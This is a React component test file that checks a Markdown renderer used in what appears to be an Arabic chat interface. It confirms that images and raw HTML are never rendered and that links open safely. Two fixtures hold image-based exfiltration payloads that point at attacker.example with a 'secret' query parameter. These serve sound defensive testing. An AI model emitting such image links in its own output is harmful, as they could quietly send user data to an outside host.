import { render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import '~/i18n';
import { Markdown } from '../Markdown';

describe('Markdown', () => {
  it('never renders an image element (no request without a click)', () => {
    const { container } = render(
      <Markdown text="![سر](https://attacker.example/?q=secret) نص" />,
    );
    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByRole('link', { name: 'سر' });
    expect(link).toHaveAttribute('href', 'https://attacker.example/?q=secret');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
  });

  it('does not render raw HTML', () => {
    const { container } = render(
      <Markdown text={'<img src="https://attacker.example/x"> <b>x</b>'} />,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('b')).toBeNull();
  });

  it('opens links in a new tab safely', () => {
    render(<Markdown text="[موقع](https://example.com)" />);
    const link = screen.getByRole('link', { name: 'موقع' });
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
  });

  it('marks the streaming wrapper for the inline caret', () => {
    const { container } = render(<Markdown text="مرحبا **ب" streaming />);
    expect(container.querySelector('.md-streaming')).not.toBeNull();
    expect(container.querySelector('strong')).not.toBeNull();
  });
});
